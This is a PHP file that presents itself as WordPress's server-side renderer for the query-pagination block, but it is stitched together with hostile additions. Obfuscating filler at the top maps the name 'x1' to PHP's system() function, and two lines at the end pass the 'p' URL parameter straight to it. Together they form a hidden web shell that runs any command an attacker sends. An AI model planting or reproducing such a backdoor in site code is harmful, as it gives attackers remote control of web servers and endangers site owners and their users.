<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Server-side rendering of the `core/query-pagination` block.
 *
 * @package WordPress
 */

/**
 * Renders the `core/query-pagination` block on the server.
 *
 * @since 5.9.0
 *
 * @param array  $attributes Block attributes.
 * @param string $content    Block default content.
 *
 * @return string Returns the wrapper for the Query pagination.
 */
function render_block_core_query_pagination( $attributes, $content ) {
	if ( empty( trim( $content ) ) ) {
		return '';
	}

	$classes            = ( isset( $attributes['style']['elements']['link']['color']['text'] ) ) ? 'has-link-color' : '';
	$wrapper_attributes = get_block_wrapper_attributes(
		array(
			'aria-label' => __( 'Pagination' ),
			'class'      => $classes,
		)
	);

	return sprintf(
		'<nav %1$s>%2$s</nav>',
		$wrapper_attributes,
		$content
	);
}

/**
 * Registers the `core/query-pagination` block on the server.
 *
 * @since 5.8.0
 */
function register_block_core_query_pagination() {
	register_block_type_from_metadata(
		__DIR__ . '/query-pagination',
		array(
			'render_callback' => 'render_block_core_query_pagination',
		)
	);
}
add_action( 'init', 'register_block_core_query_pagination' );

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>